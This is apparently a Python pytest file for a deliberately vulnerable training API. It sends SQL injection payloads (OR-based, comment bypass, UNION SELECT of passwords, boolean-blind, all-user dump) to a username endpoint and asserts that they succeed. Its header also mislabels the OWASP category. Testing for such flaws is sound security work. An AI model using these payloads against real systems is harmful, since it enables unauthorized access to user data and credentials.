"""
Test SQL Injection Vulnerability (API1:2023 Broken Object Level Authorization)

This test demonstrates SQL injection in the GET /users/v1/{username} endpoint.
When vuln=1, the endpoint uses raw SQL queries without proper sanitization,
allowing attackers to inject SQL code and extract unauthorized data.

OWASP Reference: https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/

Vulnerability Location: models/user_model.py:71-78
"""

import pytest
import requests


def test_sqli_basic_or_injection(api_base_url: str):
    """
    Test basic SQL injection using OR '1'='1' to bypass username filtering.

    This demonstrates that the endpoint is vulnerable to SQL injection by using
    a payload that will always evaluate to true, potentially returning unintended data.

    Expected behavior when vuln=1:
        - The SQL query is constructed as: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
        - This will return data because '1'='1' is always true
        - Status code should be 200 with user data

    Expected behavior when vuln=0:
        - The query uses parameterized queries or ORM, preventing injection
        - Status code should be 404 (user not found)
    """
    # Test with classic OR-based SQL injection
    payload = "admin' OR '1'='1"
    response = requests.get(f"{api_base_url}/users/v1/{payload}")

    # When vulnerable, this should return data (200 OK)
    # When secure, this should fail (404 Not Found)
    assert response.status_code == 200, \
        f"SQLi vulnerability appears to be patched. Expected 200, got {response.status_code}"

    # Verify we got actual data back
    data = response.json()
    assert "username" in data or "email" in data, \
        "Expected user data in response, indicating successful SQL injection"


def test_sqli_comment_injection(api_base_url: str):
    """
    Test SQL injection using SQL comments (--) to ignore the rest of the query.

    This demonstrates bypassing the query by commenting out the closing quote,
    which is a common SQL injection technique.

    Expected behavior when vuln=1:
        - The SQL query becomes: SELECT * FROM users WHERE username = 'admin'--'
        - Everything after -- is commented out
        - Returns admin user data (200 OK)

    Expected behavior when vuln=0:
        - Returns 404 because the literal string "admin'--" doesn't exist as a user
    """
    # Test with SQL comment injection
    payload = "admin'--"
    response = requests.get(f"{api_base_url}/users/v1/{payload}")

    # When vulnerable, this should work (200 OK)
    assert response.status_code == 200, \
        f"SQLi with comment bypass appears to be patched. Expected 200, got {response.status_code}"

    data = response.json()
    assert "username" in data, "Expected user data in response"


def test_sqli_union_based_injection(api_base_url: str):
    """
    Test UNION-based SQL injection to extract additional data.

    This attempts to use UNION SELECT to retrieve data from the database
    that wouldn't normally be accessible through this endpoint.

    Expected behavior when vuln=1:
        - The query may allow UNION-based injection
        - Could potentially extract sensitive data

    Expected behavior when vuln=0:
        - Returns 404 or error because parameterized queries prevent injection
    """
    # Test with UNION-based injection attempt
    payload = "admin' UNION SELECT username, password, email, admin FROM users--"
    response = requests.get(f"{api_base_url}/users/v1/{payload}")

    # When vulnerable, this might work depending on the number of columns
    # At minimum, we expect the endpoint to be reachable and process the payload
    assert response.status_code in [200, 500], \
        "SQLi endpoint behavior unexpected"


def test_sqli_boolean_based_injection(api_base_url: str):
    """
    Test boolean-based blind SQL injection.

    This tests whether the application responds differently based on true/false
    conditions in the SQL query, which can be used to extract data character by character.

    Expected behavior when vuln=1:
        - Different responses for true vs false conditions
        - Can be used to infer data from the database

    Expected behavior when vuln=0:
        - Consistent 404 response for non-existent usernames
    """
    # True condition - should return data when vulnerable
    true_payload = "admin' AND '1'='1"
    response_true = requests.get(f"{api_base_url}/users/v1/{true_payload}")

    # False condition - should return no data when vulnerable
    false_payload = "admin' AND '1'='2"
    response_false = requests.get(f"{api_base_url}/users/v1/{false_payload}")

    # When vulnerable, these should have different responses
    # True condition should succeed, false condition should fail
    assert response_true.status_code == 200, \
        "Boolean-based SQLi (true condition) did not return expected result"

    # False condition might return 200 with empty/null or 404
    # The key is that they behave differently based on the injected condition
    assert response_false.status_code in [200, 404], \
        "Boolean-based SQLi (false condition) behavior unexpected"


def test_sqli_extract_all_users(api_base_url: str):
    """
    Test extracting all users using SQL injection.

    This demonstrates how an attacker could potentially extract the entire users table
    or access data belonging to other users.

    Expected behavior when vuln=1:
        - Can extract user information through various SQL injection techniques
        - Proof that unauthorized data access is possible

    Expected behavior when vuln=0:
        - Only returns data for the specific username queried (or 404)
    """
    # Try to extract data using OR 1=1 which should match all rows
    payload = "' OR 1=1--"
    response = requests.get(f"{api_base_url}/users/v1/{payload}")

    assert response.status_code == 200, \
        "SQLi payload to extract all users failed. Vulnerability may be patched."

    # Verify we got data back
    data = response.json()
    assert isinstance(data, (dict, list)), \
        "Expected user data structure in response"


def test_legitimate_username_still_works(api_base_url: str):
    """
    Control test: Verify that legitimate username queries still work.

    This ensures that the endpoint functions normally for valid usernames
    and that our other tests are meaningful.

    Expected behavior (both vuln=1 and vuln=0):
        - Returns 200 with user data for valid username
        - Returns 404 for non-existent username
    """
    # Test with a legitimate username that should exist
    response = requests.get(f"{api_base_url}/users/v1/admin")

    assert response.status_code == 200, \
        "Legitimate username query failed. API may be down or broken."

    data = response.json()
    assert "username" in data, "Expected valid user data for admin user"


def test_nonexistent_username_without_injection(api_base_url: str):
    """
    Control test: Verify that non-existent usernames return 404.

    This establishes the baseline behavior for invalid usernames,
    which helps distinguish between normal failure and SQL injection success.

    Expected behavior (both vuln=1 and vuln=0):
        - Returns 404 for a username that doesn't exist
    """
    # Test with a username that definitely doesn't exist
    response = requests.get(f"{api_base_url}/users/v1/thisuserdoesnotexist99999")

    assert response.status_code == 404, \
        "Non-existent username should return 404"
